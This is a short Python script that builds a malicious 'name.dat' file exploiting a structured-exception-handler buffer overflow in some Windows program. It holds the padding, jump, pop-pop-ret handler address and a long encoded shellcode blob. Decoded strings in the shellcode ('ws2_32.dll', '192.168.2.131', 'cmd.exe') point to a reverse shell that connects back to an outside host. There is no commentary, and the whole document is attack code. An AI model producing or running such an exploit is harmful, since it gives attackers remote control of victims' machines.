#!/usr/bin/python

with open(r"name.dat","wb") as f:
    jmp = '\xeb\x06\x90\x90'
    handler = '\x02\x18\x40\x00' # you may change by yourself pop r32|pop r32|ret
    shellcode = "\xe8\xff\xff\xff\xff\xc0\x5f\xb9\xb4\x03\x01\x01\x81\xf1\x01\x01"
    shellcode += "\x01\x01\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x05\x0f\x44\xc6\xaa"
    shellcode += "\xe2\xf6\xe8\x05\x05\x05\x05\x5e\x8b\xfe\x81\xc6\x83\x02\x05\x05"
    shellcode += "\xb9\x03\x05\x05\x05\xfc\xad\x01\x3c\x07\xe2\xfa\x55\x8b\xec\x83"
    shellcode += "\xe4\xf8\x81\xec\x24\x02\x05\x05\x53\x56\x57\xb9\x8d\x10\xb7\xf8"
    shellcode += "\xe8\xa9\x01\x05\x05\x68\x8f\x02\x05\x05\xff\xd0\xb9\x40\xd5\xdc"
    shellcode += "\x2d\xe8\x98\x01\x05\x05\xb9\x6f\xf1\xd4\x9f\x8b\xf0\xe8\x8c\x01"
    shellcode += "\x05\x05\xb9\x82\xa1\x0d\xa5\x8b\xf8\xe8\x80\x01\x05\x05\xb9\x70"
    shellcode += "\xbe\x1c\x23\x89\x44\x24\x18\xe8\x72\x01\x05\x05\xb9\xd1\xfe\x73"
    shellcode += "\x1b\x89\x44\x24\x0c\xe8\x64\x01\x05\x05\xb9\xe2\xfa\x1b\x01\xe8"
    shellcode += "\x5a\x01\x05\x05\xb9\xc9\x53\x29\xdc\x89\x44\x24\x20\xe8\x4c\x01"
    shellcode += "\x05\x05\xb9\x6e\x85\x1c\x5c\x89\x44\x24\x1c\xe8\x3e\x01\x05\x05"
    shellcode += "\xb9\xe0\x53\x31\x4b\x89\x44\x24\x24\xe8\x30\x01\x05\x05\xb9\x98"
    shellcode += "\x94\x8e\xca\x8b\xd8\xe8\x24\x01\x05\x05\x89\x44\x24\x10\x8d\x84"
    shellcode += "\x24\xa0\x05\x05\x05\x50\x68\x02\x02\x05\x05\xff\xd6\x33\xc9\x85"
    shellcode += "\xc0\x0f\x85\xd8\x05\x05\x05\x51\x51\x51\x6a\x06\x6a\x01\x6a\x02"
    shellcode += "\x58\x50\xff\xd7\x8b\xf0\x33\xff\x83\xfe\xff\x0f\x84\xc0\x05\x05"
    shellcode += "\x05\x8d\x44\x24\x14\x50\x57\x57\x68\x9a\x02\x05\x05\xff\x54\x24"
    shellcode += "\x2c\x85\xc0\x0f\x85\xa8\x05\x05\x05\x6a\x02\x57\x57\x6a\x10\x8d"
    shellcode += "\x44\x24\x58\x50\x8b\x44\x24\x28\xff\x70\x10\xff\x70\x18\xff\x54"
    shellcode += "\x24\x40\x6a\x02\x58\x66\x89\x44\x24\x28\xb8\x30\x39\x05\x05\x66"
    shellcode += "\x89\x44\x24\x2a\x8d\x44\x24\x48\x50\xff\x54\x24\x24\x57\x57\x57"
    shellcode += "\x57\x89\x44\x24\x3c\x8d\x44\x24\x38\x6a\x10\x50\x56\xff\x54\x24"
    shellcode += "\x34\x85\xc0\x75\x5c\x6a\x44\x5f\x8b\xcf\x8d\x44\x24\x58\x33\xd2"
    shellcode += "\x88\x10\x40\x49\x75\xfa\x8d\x44\x24\x38\x89\x7c\x24\x58\x50\x8d"
    shellcode += "\x44\x24\x5c\xc7\x84\x24\x88\x05\x05\x05\x05\x01\x05\x05\x50\x52"
    shellcode += "\x52\x52\x6a\x01\x52\x52\x68\xa8\x02\x05\x05\x52\x89\xb4\x24\xc0"
    shellcode += "\x05\x05\x05\x89\xb4\x24\xbc\x05\x05\x05\x89\xb4\x24\xb8\x05\x05"
    shellcode += "\x05\xff\x54\x24\x34\x6a\xff\xff\x74\x24\x3c\xff\x54\x24\x18\x33"
    shellcode += "\xff\x57\xff\xd3\x5f\x5e\x33\xc0\x5b\x8b\xe5\x5d\xc3\x33\xd2\xeb"
    shellcode += "\x10\xc1\xca\x0d\x3c\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0"
    shellcode += "\x41\x8a\x01\x84\xc0\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b"
    shellcode += "\xec\x83\xec\x14\x53\x56\x57\x89\x4d\xf4\x64\xa1\x30\x05\x05\x05"
    shellcode += "\x89\x45\xfc\x8b\x45\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45"
    shellcode += "\xec\x8b\xcf\xe8\xd2\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74"
    shellcode += "\x4f\x8b\x46\x3c\x8b\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c"
    shellcode += "\x03\xce\xe8\x96\xff\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce"
    shellcode += "\x33\xc0\x89\x4d\xf0\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c"
    shellcode += "\x81\x03\xce\xe8\x75\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e"
    shellcode += "\x8b\x45\xfc\x8b\x4d\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde"
    shellcode += "\x3b\x7d\xec\x75\x9c\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d"
    shellcode += "\xfc\x8b\x44\x33\x24\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c"
    shellcode += "\x8d\x04\x88\x8b\x04\x30\x03\xc6\xeb\xdd\x2f\x05\x05\x05\xf2\x05"
    shellcode += "\x05\x05\x80\x01\x05\x05\x77\x73\x32\x5f\x33\x32\x2e\x64\x6c\x6c"
    shellcode += "\x05\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x2e\x31\x33\x31\x05\x63"
    shellcode += "\x6d\x64\x2e\x65\x78\x65\x05"

    payload = 'a'*84 + jmp + handler + shellcode
    f.write(payload + 'c'*(10000-len(payload)))
